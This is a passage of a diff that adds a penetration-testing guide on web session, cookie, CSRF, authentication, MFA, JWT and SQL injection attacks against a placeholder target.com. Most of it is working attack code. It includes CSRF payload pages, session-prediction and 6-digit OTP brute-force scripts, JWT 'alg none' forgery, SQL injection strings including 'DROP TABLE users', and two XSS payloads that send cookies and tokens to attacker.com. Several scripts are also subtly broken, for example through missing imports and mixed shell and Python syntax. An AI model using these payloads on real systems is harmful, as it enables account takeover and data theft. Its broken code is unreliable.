+curl -b "SESSIONID=$FAKE_SESSION" -c - https://target.com/login \
+    -d "username=victim&password=password"
+
+# 2. Session prediction attack
+# Generate valid session IDs by pattern
+
+python3 << 'EOF'
+import requests
+import time
+
+# Predict session based on timestamp
+current_time = int(time.time())
+
+for offset in range(-10, 10):
+    predicted_session = str(current_time + offset)
+    
+    cookies = {'SESSIONID': predicted_session}
+    response = requests.get('https://target.com/user', cookies=cookies)
+    
+    if 'login' not in response.text.lower():
+        print(f"Valid session found: {predicted_session}")
+EOF
+
+# 3. Cookie manipulation
+# Modify cookie to change user/privilege
+
+# Original cookie: user_id=123
+# Modified cookie: user_id=456 (target user)
+
+curl -b "user_id=456; session_token=abc123" https://target.com/profile
+
+# 4. Double-submit cookie attack bypass
+# CSRF protection relies on matching cookies
+# If both cookies submitted by JavaScript, CSRF tokens bypass possible
+
+python3 << 'EOF'
+import requests
+
+session = requests.Session()
+
+# Get CSRF token from cookie
+session.get('https://target.com/form')
+csrf_token = session.cookies.get('csrf_token')
+
+# Also appears in HTML form
+# If same token in both locations, predictable
+if csrf_token == 'predictable_value':
+    print("CSRF token predictable - CSRF possible")
+EOF
+```
+
+[Inference] Cookie-based session attacks exploit weak generation, transmission, or validation enabling unauthorized session access or privilege escalation.
+
+**Cross-Site Request Forgery (CSRF) via Cookies**
+
+Exploit cookie-based request authentication:
+
+```bash
+# CSRF requires:
+# 1. Browser cookies (automatically sent)
+# 2. No CSRF token or predictable token
+# 3. State-changing operation (POST without CSRF protection)
+
+# Identify CSRF vulnerability
+# 1. Check for CSRF tokens
+curl -s https://target.com/form | grep -i "csrf\|token" 
+
+# If no token found, likely CSRF vulnerable
+
+# 2. Craft CSRF attack payload
+cat > csrf_payload.html << 'EOF'
+<html>
+<body>
+    <img src="https://target.com/api/transfer?amount=1000&to=attacker_account" style="display:none;">
+</body>
+</html>
+EOF
+
+# When victim visits page while logged in:
+# - Browser automatically includes session cookies
+# - Image request made with victim's credentials
+# - Transfer executed without victim's knowledge
+
+# 3. POST-based CSRF (form submission)
+cat > csrf_form.html << 'EOF'
+<html>
+<body>
+    <form action="https://target.com/change_password" method="POST" style="display:none;">
+        <input type="hidden" name="new_password" value="attacker_password">
+        <input type="submit">
+    </form>
+    <script>document.forms[0].submit();</script>
+</body>
+</html>
+EOF
+```
+
+CSRF token bypass techniques:
+
+```bash
+# 1. Token validation weakness
+# CSRF token ignored if not present
+# Test: Submit form without token
+
+curl -X POST https://target.com/form -d "action=delete&id=123"
+
+# 2. Token re-use
+# Same token accepted for multiple requests
+# Predict or capture token, use repeatedly
+
+# 3. Token parameter mismatch
+# Server checks 'csrf_token' but app uses 'token'
+# Submit with correct parameter name while omitting checked one
+
+# 4. Double-submit cookie bypass
+# Server compares cookie value to submitted value
+# If attacker can set cookie, bypass possible
+# Via subdomain cookie, HTTP-only: false, etc.
+
+# 5. Null value bypass
+# Test: csrf_token=  (empty)
+# Some implementations treat null as "valid" (missing = no check)
+```
+
+[Inference] CSRF exploitation leverages cookie-based authentication where session validation relies solely on presence in browser cookies without additional per-request verification tokens.
+
+**Cookie Theft and Exfiltration**
+
+Capture cookies through various methods:
+
+```bash
+# 1. MITM interception (HTTP without Secure flag)
+tcpdump -i eth0 -A "tcp port 80" | grep -i "set-cookie\|cookie:"
+
+# 2. XSS-based cookie stealing
+# Payload injected into vulnerable application
+<script>
+    // Exfiltrate cookies to attacker server
+    fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
+</script>
+
+# HttpOnly cookies not accessible via JavaScript (if set properly)
+# But unprotected cookies stolen via XSS
+
+# 3. Network sniffing
+# Unencrypted HTTP traffic contains plaintext cookies
+bettercap -iface eth0
+# Monitor for Set-Cookie headers
+
+# 4. Browser history/cache analysis
+# Cookies sometimes cached in browser history
+ls ~/.mozilla/firefox/profile/cookies.sqlite  # Firefox
+open ~/Library/Safari/History.plist  # Safari
+
+# 5. Memory dump
+# Extract cookies from running browser process
+# Requires system-level access
+strings /proc/<browser_pid>/maps | grep -i cookie
+```
+
+[Inference] Cookie theft enables full account takeover when session cookies captured—protective measures (HTTPS, Secure/HttpOnly flags) mitigate but don't eliminate theft vectors.
+
+---
+
+## Session Management Assessment
+
+Session management assessment evaluates authentication token lifecycle, session fixation prevention, timeout policies, and privilege handling—identifying session-based privilege escalation vectors.
+
+**Session Lifecycle Analysis**
+
+Track session from creation through termination:
+
+```bash
+# 1. Session creation (authentication)
+curl -v https://target.com/login \
+    -d "username=user&password=pass" \
+    2>&1 | grep -i "set-cookie"
+
+# Output: Set-Cookie: SESSIONID=abc123; Path=/; HttpOnly; Secure
+
+# 2. Session use (authenticated requests)
+curl -b "SESSIONID=abc123" https://target.com/dashboard
+
+# 3. Session termination (logout)
+curl -b "SESSIONID=abc123" https://target.com/logout
+curl -v https://target.com/logout 2>&1 | grep -i "set-cookie"
+
+# Expected: Set-Cookie: SESSIONID=; Max-Age=0  (delete cookie)
+# Or: Set-Cookie: SESSIONID=deleted; Path=/; Max-Age=0
+```
+
+Session lifecycle vulnerabilities:
+
+```bash
+# 1. Session not invalidated on logout
+# After logout, old session still valid
+
+curl -b "SESSIONID=old_session" https://target.com/dashboard
+# Expected: 401 Unauthorized
+# Actual: 200 OK (session still valid)
+
+# 2. Session fixation
+# Attacker forces specific session ID, user authenticates with it
+
+# Vulnerable scenario:
+# Pre-authentication: attacker provides SESSIONID=attacker_controlled
+# User logs in without creating new session: SESSIONID=attacker_controlled
+# Attacker uses same SESSIONID to access user account
+
+# 3. Concurrent session management
+# Multiple simultaneous sessions for single user allowed
+curl -b "SESSIONID=session1" https://target.com/profile
+curl -b "SESSIONID=session2" https://target.com/profile
+# Both succeed - user can have multiple active sessions
+
+# 4. Session persistence across password change
+# Session remains valid after password change
+# User can change password but session not invalidated
+```
+
+[Inference] Session lifecycle analysis reveals improper invalidation, fixation vulnerabilities, and persistence issues enabling unauthorized continued access after compromises.
+
+**Concurrent Session Testing**
+
+Identify multiple simultaneous session handling:
+
+```bash
+# Authentication scenario
+# Browser 1: Login → receives SESSIONID_1
+# Browser 2: Login → receives SESSIONID_2
+# Question: Are both sessions valid simultaneously?
+
+# Simulate multiple sessions
+python3 << 'EOF'
+import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
+def make_session():
+    s = requests.Session()
+    retries = Retry(connect=3, backoff_factor=0.5)
+    s.mount('https://', HTTPAdapter(max_retries=retries))
+    return s
+
+# Create two independent sessions (different browser profiles)
+session1 = make_session()
+session2 = make_session()
+
+# Both authenticate as same user
+resp1 = session1.post('https://target.com/login', 
+    data={'username': 'user', 'password': 'pass'})
+resp2 = session2.post('https://target.com/login',
+    data={'username': 'user', 'password': 'pass'})
+
+# Extract session cookies
+session1_cookie = session1.cookies.get('SESSIONID')
+session2_cookie = session2.cookies.get('SESSIONID')
+
+print(f"Session 1: {session1_cookie}")
+print(f"Session 2: {session2_cookie}")
+
+# Test both sessions simultaneously
+resp1_test = session1.get('https://target.com/user')
+resp2_test = session2.get('https://target.com/user')
+
+print(f"Session 1 valid: {resp1_test.status_code == 200}")
+print(f"Session 2 valid: {resp2_test.status_code == 200}")
+
+# If both valid, multiple concurrent sessions allowed
+EOF
+
+# Privilege escalation via concurrent sessions
+# Session 1: Limited user account (readonly access)
+# Session 2: Admin account
+# If application context switches possible: lateral privilege escalation
+```
+
+[Inference] Concurrent session policies vary by application—unrestricted concurrent sessions increase account takeover risk by enabling session theft without forcing legitimate
+
+**Session Timeout Testing**
+
+Identify idle and absolute timeout policies:
+
+```bash
+# 1. Idle timeout (timeout after inactivity)
+# Establish session
+SESSIONID=$(curl -s -c - https://target.com/login \
+    -d "username=user&password=pass" | grep SESSIONID | awk '{print $NF}')
+
+# Wait for idle timeout period
+# Typical: 15-30 minutes for web apps, 8-12 hours for banking
+
+for i in {1..180}; do
+    echo "Waiting... minute $i"
+    sleep 60
+    
+    # Test if session still valid
+    curl -s -b "SESSIONID=$SESSIONID" https://target.com/dashboard | grep -q "logged in"
+    if [ $? -ne 0 ]; then
+        echo "Session expired after $i minutes"
+        break
+    fi
+done
+
+# 2. Absolute timeout (timeout regardless of activity)
+# Long-term session test
+
+# Establish session
+DATE=$(date +%s)
+SESSIONID=$(curl -s -c - https://target.com/login \
+    -d "username=user&password=pass" | grep SESSIONID | awk '{print $NF}')
+
+# Perform activity to prevent idle timeout
+for day in {1..30}; do
+    # Activity every 5 minutes (prevents idle timeout)
+    for i in {1..288}; do  # 288 * 5 min = 1440 min = 24 hours
+        sleep 300
+        curl -s -b "SESSIONID=$SESSIONID" https://target.com/dashboard > /dev/null
+    done
+    
+    # Check if session still valid
+    if ! curl -s -b "SESSIONID=$SESSIONID" https://target.com/dashboard | grep -q "logged in"; then
+        echo "Absolute timeout triggered after $day days"
+        break
+    fi
+done
+
+# 3. Timeout configuration analysis
+# Check HTTP headers for timeout hints
+curl -I https://target.com | grep -iE "cache-control|expires|set-cookie"
+
+# Extract timeout from JavaScript
+curl -s https://target.com/assets/app.js | grep -iE "timeout|session.*[0-9]+" | head -10
+```
+
+Timeout bypass techniques:
+
+```bash
+# 1. Activity-based timeout bypass
+# Keep session alive through periodic requests
+python3 << 'EOF'
+import requests
+import time
+
+session = requests.Session()
+
+# Authenticate
+session.post('https://target.com/login', 
+    data={'username': 'user', 'password': 'pass'})
+
+# Maintain session indefinitely
+while True:
+    # Perform lightweight request to refresh activity
+    session.get('https://target.com/api/ping')
+    
+    # Sleep less than idle timeout
+    # If timeout is 30 minutes, request every 25 minutes
+    time.sleep(1500)  # 25 minutes
+EOF
+
+# 2. Frame-based timeout reset
+# Render hidden frames making requests periodically
+cat > timeout_bypass.html << 'EOF'
+<iframe style="display:none;" src="https://target.com/api/ping"></iframe>
+<script>
+    // Refresh iframe every 20 minutes (less than 30-min timeout)
+    setInterval(function() {
+        document.querySelector('iframe').src = 
+            'https://target.com/api/ping?' + Date.now();
+    }, 1200000);  // 20 minutes in milliseconds
+</script>
+EOF
+
+# 3. Predictable session ID reuse
+# If sessions not invalidated on logout, reconnect with old ID
+curl -b "SESSIONID=old_session_id" https://target.com/dashboard
+```
+
+[Inference] Weak timeout policies enable prolonged account access from compromised sessions, while timeout bypass through continuous activity defeats protection mechanisms.
+
+**Session Fixation Attack**
+
+Test application for session fixation vulnerabilities:
+
+```bash
+# Session fixation requires:
+# 1. Application accepts pre-set session ID from attacker
+# 2. Session not regenerated on authentication
+# 3. Attacker and victim use same session ID
+
+# Attack procedure:
+
+# 1. Attacker generates/specifies session ID
+ATTACKER_SESSION="FIXATED_SESSION_ID"
+
+# 2. Attacker tricks victim to authenticate with this ID
+# Method 1: Direct link with session parameter
+# https://target.com/login?SESSIONID=FIXATED_SESSION_ID
+
+# Method 2: Set cookie via third-party domain
+cat > set_cookie_attack.html << 'EOF'
+<html>
+<body>
+    <img src="https://target.com/set_cookie?SESSIONID=FIXATED_SESSION_ID">
+</body>
+</html>
+EOF
+
+# 3. Test if victim's authentication uses attacker's session ID
+# Simulate victim login
+curl -v https://target.com/login \
+    -b "SESSIONID=$ATTACKER_SESSION" \
+    -d "username=victim&password=password" \
+    2>&1 | grep -i "set-cookie"
+
+# If same SESSIONID returned: session fixation vulnerability
+# Attacker uses FIXATED_SESSION_ID to access victim's account
+
+# 4. Verify exploitation
+curl -b "SESSIONID=$ATTACKER_SESSION" https://target.com/dashboard
+# Should show victim's account if vulnerable
+```
+
+Session fixation remediation verification:
+
+```bash
+# Secure implementation: Session ID changes on login
+# Test:
+
+# 1. Before login
+curl -v https://target.com 2>&1 | grep -i "set-cookie"
+# Pre-login session: SESSIONID=pre_auth_123
+
+# 2. During login
+curl -v https://target.com/login \
+    -b "SESSIONID=pre_auth_123" \
+    -d "username=user&password=pass" \
+    2>&1 | grep -i "set-cookie"
+
+# 3. After login
+# Should show NEW session ID different from pre-auth
+
+# If post-login SESSIONID differs from pre-login: SECURE
+# If same: VULNERABLE to session fixation
+```
+
+[Inference] Session fixation attacks succeed when applications fail to regenerate session identifiers upon authentication, enabling attackers to maintain control through unified session IDs.
+
+**Privilege Escalation via Session Manipulation**
+
+Exploit session data handling for privilege escalation:
+
+```bash
+# 1. Direct privilege flag modification
+# Session stores user role/privilege information
+
+# Capture session cookie
+curl -s -c cookies.txt https://target.com/login \
+    -d "username=lowprivuser&password=pass" > /dev/null
+
+# Extract session
+SESSION=$(cat cookies.txt | grep SESSION | awk '{print $NF}')
+
+# Analyze session if encoded/encrypted
+python3 << 'EOF'
+import base64
+import json
+
+session = "encoded_session_value"
+
+# Attempt base64 decode
+try:
+    decoded = base64.b64decode(session)
+    print(decoded)
+    
+    # If JSON format, parse
+    try:
+        data = json.loads(decoded)
+        print(f"User: {data.get('user')}")
+        print(f"Role: {data.get('role')}")
+        
+        # Modify privilege
+        data['role'] = 'admin'
+        
+        # Re-encode
+        modified = base64.b64encode(json.dumps(data).encode()).decode()
+        print(f"Modified session: {modified}")
+    except:
+        pass
+except:
+    print("Not base64 encoded")
+EOF
+
+# 2. Cookie injection via XSS
+# Inject JavaScript to modify session cookie
+<script>
+    document.cookie = "role=admin; path=/;";
+    document.cookie = "is_admin=true; path=/;";
+    
+    // Force page reload to apply new cookies
+    window.location.reload();
+</script>
+
+# 3. Session object manipulation via CORS/fetch
+# If authentication data retrievable via API
+fetch('https://target.com/api/session')
+    .then(r => r.json())
+    .then(data => {
+        data.role = 'admin';
+        
+        // POST modified data back
+        fetch('https://target.com/api/session', {
+            method: 'POST',
+            body: JSON.stringify(data)
+        });
+    });
+
+# 4. Implicit privilege via parameter
+# Some applications store privilege in URL/request
+curl "https://target.com/dashboard?user_id=1&is_admin=1"
+
+# Change to target user with admin flag
+curl "https://target.com/dashboard?user_id=999&is_admin=1"
+```
+
+[Inference] Session privilege escalation exploits improper server-side validation where client-submitted data (roles, permissions) accepted without verification against authentication authority.
+
+**Cross-Site Request Forgery (CSRF) Token Analysis**
+
+Examine CSRF token implementation:
+
+```bash
+# 1. Token detection
+curl -s https://target.com/form | grep -iE "csrf|token" | head -10
+
+# 2. Token validity testing
+# Capture form with CSRF token
+TOKEN=$(curl -s https://target.com/form | grep -oE 'csrf.*value="[^"]*' | cut -d'"' -f2)
+
+# Submit with valid token
+curl -X POST https://target.com/action \
+    -d "csrf_token=$TOKEN&action=delete&id=123"
+
+# 3. Token reuse testing
+# Use same token multiple times
+for i in {1..10}; do
+    curl -X POST https://target.com/action \
+        -d "csrf_token=$TOKEN&action=delete&id=$i"
+done
+
+# If all succeed: token not invalidated after use (weak implementation)
+
+# 4. Token validation weakness
+# Submit without token
+curl -X POST https://target.com/action -d "action=delete&id=123"
+
+# Submit with empty token
+curl -X POST https://target.com/action \
+    -d "csrf_token=&action=delete&id=123"
+
+# Submit with different token format
+curl -X POST https://target.com/action \
+    -d "csrf_token=invalid_value&action=delete&id=123"
+
+# 5. Parameter name mismatch
+# Server checks 'csrf_token' but form uses 'token'
+# Test with expected parameter names
+for param in "csrf_token" "token" "_token" "csrfToken" "authenticity_token"; do
+    curl -X POST https://target.com/action \
+        -d "${param}=test_value&action=delete&id=123"
+done
+```
+
+CSRF token bypass techniques:
+
+```bash
+# 1. Double-submit cookie pattern weakness
+# CSRF token matches cookie value (for stateless validation)
+# Attacker can set cookie if subdomain accessible
+
+# If vulnerable to subdomain cookie setting:
+# Set CSRF token cookie via subdomain
+curl -b "csrf_token=known_value" https://subdomain.target.com
+
+# Then submit form with matching token
+curl -X POST https://target.com/action \
+    -b "csrf_token=known_value" \
+    -d "csrf_token=known_value&action=delete&id=123"
+
+# 2. Referrer header bypass
+# CSRF protection relies on Referrer validation
+# If Referrer validation weak/absent
+
+# Submit from different origin
+curl -H "Referer: https://attacker.com" \
+    -X POST https://target.com/action \
+    -d "csrf_token=$TOKEN&action=delete&id=123"
+
+# 3. Method override bypass
+# Server checks POST CSRF but accepts PUT/DELETE
+
+curl -X PUT https://target.com/action \
+    -d "action=delete&id=123"
+    # Missing CSRF token
+
+# 4. CORS CSRF (if CORS misconfigured)
+# Attacker's domain allowed to make cross-origin requests
+# JavaScript-based CSRF from attacker site
+
+cat > csrf_cors.html << 'EOF'
+<script>
+    fetch('https://target.com/api/action', {
+        method: 'POST',
+        credentials: 'include',
+        body: 'action=delete&id=123'
+    });
+</script>
+EOF
+```
+
+[Inference] CSRF token protection depends on implementation details—weak generation, reuse, or validation enable straightforward bypasses despite token presence.
+
+---
+
+## Authentication Mechanism Identification
+
+Authentication mechanism identification reveals login methods, password policies, account lockout mechanisms, and multi-factor authentication (MFA) implementations—mapping attack surface for credential attacks and bypass attempts.
+
+**Authentication Method Detection**
+
+Identify login and authentication endpoints:
+
+```bash
+# 1. Form-based authentication
+curl -s https://target.com | grep -iE "<form.*login|<input.*password"
+
+# Extract form details
+python3 << 'EOF'
+from bs4 import BeautifulSoup
+import requests
+
+resp = requests.get('https://target.com/login')
+soup = BeautifulSoup(resp.content, 'html.parser')
+
+forms = soup.find_all('form')
+for form in forms:
+    print(f"Action: {form.get('action')}")
+    print(f"Method: {form.get('method')}")
+    print(f"Inputs:")
+    for inp in form.find_all('input'):
+        print(f"  - {inp.get('name')}: {inp.get('type')}")
+EOF
+
+# 2. API-based authentication (JSON endpoints)
+curl -s https://target.com/api/login -X POST -H "Content-Type: application/json" \
+    -d '{"username":"test","password":"test"}' -w "\n%{http_code}\n"
+
+# 3. HTTP Basic Authentication
+curl -v https://target.com/admin 2>&1 | grep -i "www-authenticate"
+# If present: WWW-Authenticate: Basic realm="..."
+
+# 4. OAuth/Social login
+curl -s https://target.com | grep -iE "github|google|facebook|oauth" | head -10
+
+# 5. SAML authentication
+curl -s https://target.com | grep -iE "saml|assertion" | head -10
+
+# 6. Certificate-based authentication
+curl -v --cert client_cert.pem https://target.com 2>&1 | grep -i "certificate"
+```
+
+[Inference] Authentication method identification reveals multiple potential attack vectors—form-based credentials, API token interception, certificate compromise—each requiring distinct exploitation techniques.
+
+**Password Policy Extraction**
+
+Identify password requirements and weaknesses:
+
+```bash
+# 1. Client-side password validation
+curl -s https://target.com/register | grep -oE "pattern|minlength|maxlength|title" | head -20
+
+# Extract JavaScript password rules
+curl -s https://target.com/assets/auth.js | grep -iE "password.*regex|password.*check|password.*rule"
+
+# 2. Password requirement analysis
+python3 << 'EOF'
+import re
+
+js_content = open('auth.js').read()
+
+# Search for password validation patterns
+patterns = re.findall(r'/(.*?)/[gimsu]*', js_content)
+
+for pattern in patterns[:10]:
+    if any(char in pattern for char in ['^', '$', '[', ']', '(', ')']):
+        print(f"Regex pattern found: /{pattern}/")
+        # Analyze for weakness
+        if '.*' in pattern:
+            print("  - Allows any character (no special char requirement)")
+        if '{' in pattern:
+            length = re.search(r'{(\d+),?(\d+)?}', pattern)
+            if length:
+                print(f"  - Length requirement: {length.group(0)}")
+EOF
+
+# 3. Registration form policy enumeration
+# Attempt registration with various passwords
+
+passwords_to_test = [
+    "pass",  # Too short
+    "password",  # No special chars
+    "12345678",  # No letters
+    "abcdefgh",  # No numbers
+    "P@ssw0rd",  # Meets typical requirements
+]
+
+for pwd in passwords_to_test:
+    curl -X POST https://target.com/register \
+        -d "username=test_user&password=$pwd" \
+        -w "\n%{http_code}\n"
+```
+
+Common password policy weaknesses:
+
+```
+Minimum length < 8 characters: Weak
+No special character requirement: Weaker
+No uppercase/lowercase mixing: Weak
+No number requirement: Weak
+Password history < 3: Users recycle passwords
+Password age unlimited: Allows stale passwords
+No lockout after failed attempts: Enables brute-force
+```
+
+[Inference] Weak password policies combined with absence of rate limiting enable practical password brute-force attacks where common passwords crack quickly.
+
+**Account Lockout and Rate Limiting**
+
+Test account protection mechanisms:
+
+```bash
+# 1. Determine lockout threshold
+username="test_user"
+
+# Attempt multiple failed logins
+for i in {1..20}; do
+    response=$(curl -s -X POST https://target.com/login \
+        -d "username=$username&password=wrongpass$i" \
+        -w "%{http_code}")
+    
+    # Check for lockout indicators
+    if echo "$response" | grep -qi "locked\|suspended\|attempts remaining"; then
+        echo "Account locked after $i attempts"
+        break
+    fi
+    
+    # Extract attempts remaining if provided
+    attempts=$(echo "$response" | grep -oE "attempts remaining: [0-9]+" | awk '{print $NF}')
+    if [ -n "$attempts" ]; then
+        echo "Attempt $i: $attempts attempts remaining"
+    fi
+done
+
+# 2. Lockout duration measurement
+# Attempt login after lockout
+echo "Testing lockout duration..."
+
+for i in {1..30}; do
+    response=$(curl -s -X POST https://target.com/login \
+        -d "username=$username&password=wrongpass" \
+        -w "%{http_code}")
+    
+    if echo "$response" | grep -qi "unlocked\|success"; then
+        echo "Account unlocked after $(($i * 60)) seconds"
+        break
+    fi
+    
+    sleep 60  # Wait 1 minute between attempts
+done
+
+# 3. Rate limiting on login endpoint
+# Test for response time delays
+
+python3 << 'EOF'
+import requests
+import time
+
+url = "https://target.com/login"
+
+for attempt in range(1, 11):
+    start = time.time()
+    
+    response = requests.post(url, data={
+        'username': 'test',
+        'password': 'test'
+    })
+    
+    elapsed = time.time() - start
+    
+    print(f"Attempt {attempt}: {elapsed:.2f} seconds")
+    
+    # If delay increases: rate limiting in effect
+    # delay increases exponentially: exponential backoff
+EOF
+
+# 4. Account enumeration via rate limiting
+# Different response times for valid vs. invalid users
+
+python3 << 'EOF'
+import requests
+import statistics
+
+def test_user(username, is_valid):
+    times = []
+    
+    for i in range(5):
+        start = time.time()
+        requests.post('https://target.com/login',
+            data={'username': username, 'password': 'incorrect'})
+        times.append(time.time() - start)
+    
+    avg_time = statistics.mean(times)
+    print(f"User '{username}' ({valid}: {avg_time:.3f}s")
+    
+    return avg_time
+
+# Test with known valid vs. invalid users
+valid_time = test_user('admin', True)
+invalid_time = test_user('nonexistent_user_xyz', False)
+
+if valid_time > invalid_time * 1.5:
+    print("Account enumeration possible via timing")
+EOF
+```
+
+[Inference] Weak rate limiting or absence of account lockout enables practical password brute-force attacks, while timing differences in responses reveal valid account names for targeted attacks.
+
+**Multi-Factor Authentication (MFA) Detection and Bypass**
+
+Identify and test MFA implementations:
+
+```bash
+# 1. MFA method detection
+curl -s https://target.com/login | grep -iE "totp|otp|mfa|2fa|two.factor|authenticator|sms|email"
+
+# 2. MFA enforcement testing
+# Authenticate without providing MFA code
+
+curl -X POST https://target.com/login \
+    -d "username=user&password=correct_password" \
+    -c cookies.txt
+
+# Check if authenticated without MFA
+curl -b cookies.txt https://target.com/dashboard \
+    -w "%{http_code}"
+
+# If 200: MFA not enforced
+# If 302 redirect to MFA: MFA enforced
+
+# 3. MFA code brute-force
+# Typical MFA codes: 6-digit numbers (000000-999999)
+
+python3 << 'EOF'
+import requests
+from itertools import product
+
+session = requests.Session()
+
+# First authenticate to get MFA prompt
+session.post('https://target.com/login',
+    data={'username': 'user', 'password': 'password'})
+
+# Brute-force MFA code
+for code in range(0, 1000000):
+    otp = f"{code:06d}"
+    
+    response = session.post('https://target.com/mfa_verify',
+        data={'otp': otp})
+    
+    if response.status_code == 200 and 'success' in response.text:
+        print(f"MFA code found: {otp}")
+        break
+    
+    if code % 10000 == 0:
+        print(f"Tested: {otp}")
+EOF
+
+# 4. MFA bypass techniques
+
+# Backup codes leakage
+curl -s https://target.com/security | grep -oE "[0-9]{4}-[0-9]{4}-[0-9]{4}"
+
+# Session fixation via MFA
+# Force user to authenticate with attacker's session
+# Then bypass MFA check
+
+# MFA implementation flaws
+# - Code sent via email/SMS: Intercept
+# - Code stored in JavaScript: Extract from code
+# - Sequential codes: Predict next code
+
+# TOTP (Time-based OTP) recovery
+# If backup codes available: obtain secret key
+# Regenerate valid TOTP codes offline
+
+# 5. Account recovery via MFA bypass
+# Use "forgot password" if not MFA-protected
+curl -X POST https://target.com/forgot_password \
+    -d "email=user@example.com"
+
+# May send reset link via email without MFA
+# If email compromise possible: reset account
+```
+
+[Inference] MFA implementation weaknesses—code brute-force, backup code exposure, sequential prediction—enable MFA bypass achieving account access despite second-factor protection.
+
+**Session Hijacking and Token Interception**
+
+Exploit authentication tokens for account takeover:
+
+```bash
+# 1. Token interception via MITM (HTTP without HTTPS)
+tcpdump -i eth0 -A "tcp port 80" | grep -i "authorization\|cookie\|token"
+
+# 2. Token extraction from browser
+# Via XSS vulnerability
+<script>
+    // Extract authentication tokens
+    const token = localStorage.getItem('auth_token');
+    const cookie = document.cookie;
+    
+    // Exfiltrate
+    fetch('https://attacker.com/steal?token=' + encodeURIComponent(token));
+</script>
+
+# 3. Token reuse testing
+# Capture authentication token
+TOKEN=$(curl -s -c cookies.txt https://target.com/login \
+    -d "username=user&password=pass" | grep -oE "token=[^;]*" | cut -d'=' -f2)
+
+# Use token from different client/IP
+curl -H "Authorization: Bearer $TOKEN" https://target.com/api/profile
+
+# If successful: token not bound to client IP/device
+
+# 4. Token prediction/generation
+# If tokens use predictable patterns
+
+python3 << 'EOF'
+import hashlib
+import time
+
+# Common weak token generation patterns
+username = 'admin'
+
+# Pattern 1: MD5(username)
+token1 = hashlib.md5(username.encode()).hexdigest()
+
+# Pattern 2: MD5(username + timestamp)
+timestamp = int(time.time())
+token2 = hashlib.md5((username + str(timestamp)).encode()).hexdigest()
+
+# Pattern 3: Sequential numeric tokens
+for token_num in range(1, 100000):
+    token3 = str(token_num)
+    
+    # Test if token valid
+    # requests.get(url, headers={'Authorization': token3})
+EOF
+
+# 5. JWT token manipulation (if using JWT)
+python3 << 'EOF'
+import jwt
+import base64
+import json
+
+# Extract JWT from authorization header
+token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+
+# Decode (without verification)
+header = jwt.get_unverified_header(token)
+payload = jwt.decode(token, options={"verify_signature": False})
+
+print(f"Algorithm: {header['alg']}")
+print(f"Payload: {payload}")
+
+# JWT vulnerabilities
+
+# 1. Algorithm confusion (alg: none)
+# Modify algorithm to "none"
+modified_payload = {
+    'sub': 'admin',
+    'iat': int(time.time()),
+    'alg': 'none'
+}
+
+# Create new token with no signature
+new_token = jwt.encode(modified_payload, '', algorithm='none')
+
+# 2. Weak secret key
+# Brute-force JWT signature with dictionary
+import jwt
+
+wordlist = ['secret', 'password', 'admin123', '12345678']
+
+for secret in wordlist:
+    try:
+        payload = jwt.decode(token, secret, algorithms=['HS256'])
+        print(f"Secret found: {secret}")
+        
+        # Modify payload with known secret
+        payload['role'] = 'admin'
+        new_token = jwt.encode(payload, secret, algorithm='HS256')
+        break
+    except:
+        pass
+EOF
+```
+
+[Inference] Authentication token exploitation enables full account access when tokens captured, reused, or manipulated without additional verification mechanisms like device binding or geographic validation.
+
+---
+
+## Input Validation Testing Points
+
+Input validation testing identifies missing or improper sanitization enabling injection attacks, command execution, and data exfiltration through application input processing flaws.
+
+**Common Input Validation Testing Locations**
+
+Identify all user input points requiring testing:
+
+```bash
+# 1. HTML forms
+curl -s https://target.com | grep -oE "<input[^>]*>" | head -20
+
+# Extract input parameters
+python3 << 'EOF'
+from bs4 import BeautifulSoup
+import requests
+
+resp = requests.get('https://target.com')
+soup = BeautifulSoup(resp.content, 'html.parser')
+
+inputs = soup.find_all('input')
+for inp in inputs:
+    print(f"Name: {inp.get('name')}, Type: {inp.get('type')}, Value: {inp.get('value')}")
+
+textareas = soup.find_all('textarea')
+for ta in textareas:
+    print(f"Textarea: {ta.get('name')}")
+
+selects = soup.find_all('select')
+for sel in selects:
+    print(f"Select: {sel.get('name')}")
+EOF
+
+# 2. URL parameters
+curl -s "https://target.com/search?q=test&category=1&sort=name" -w "\n"
+
+# Extract parameters
+python3 << 'EOF'
+from urllib.parse import urlparse, parse_qs
+
+url = "https://target.com/search?q=test&category=1&sort=name"
+parsed = urlparse(url)
+params = parse_qs(parsed.query)
+
+for param, values in params.items():
+    print(f"{param}: {values}")
+EOF
+
+# 3. JSON API endpoints
+curl -X POST https://target.com/api/search \
+    -H "Content-Type: application/json" \
+    -d '{"query":"test","limit":10}' -w "\n"
+
+# 4. Cookie values
+curl -s -c - https://target.com | grep -i cookie
+
+# 5. HTTP headers (User-Agent, Referer, etc.)
+curl -I -H "User-Agent: TestAgent" -H "X-Custom-Header: test" https://target.com
+```
+
+[Inference] Comprehensive input validation testing requires systematic testing of all input points—forms, parameters, headers—where user-supplied data enters application processing.
+
+**SQL Injection Testing**
+
+Test for SQL injection vulnerabilities:
+
+```bash
+# 1. Basic SQL injection detection
+# Test with single quote to trigger SQL error
+
+curl "https://target.com/search?q=test'"
+# Error: "SQL syntax error" or database error message
+
+# 2. Numeric parameter testing
+curl "https://target.com/user?id=1' OR '1'='1"
+curl "https://target.com/user?id=1 OR 1=1"
+curl "https://target.com/user?id=1; DROP TABLE users--"
+
+# 3. Boolean-based blind SQL injection
+# Application behavior changes based on SQL truth
+
+curl "https://target.com/login?username=admin' AND '1'='1"  # True condition
+curl "https://target.com/login?username=admin' AND '1'='2"  # False condition
+
+# If different responses: SQL injection likely
+
+# 4. Time-based blind SQL injection
+# Database delays indicate vulnerable queries
+
+# MySQL SLEEP function
+curl "https://target.com/search?q=test' AND SLEEP(5)--"
+
+# PostgreSQL pg_sleep
+curl "https://target.com/search?q=test' AND pg_sleep(5)--"
+
+# Measure response time
+python3 << 'EOF'
+import requests
+import time
+
+# Normal query
+start = time.time()
+requests.get('https://target.com/search?q=test')
+normal_time = time.time() - start
+
+# SQL injection with delay
+start = time.time()
+requests.get('https://target.com/search?q=test\' AND SLEEP(5)--')
+delayed_time = time.time() - start
+
+if delayed_time > normal_time + 4:
+    print("Time-based SQL injection confirmed")
+EOF
+
+# 5. Data extraction via UNION injection
+# UNION allows combining query results
+
+# Determine column count first
+curl "https://target.com/search?q=test' ORDER BY 5--"  # Increase until error
+
+# UNION SELECT with known columns
+curl "https://target.com/search?q=test' UNION SELECT 1,2,3,4--"
+
+# Extract database information
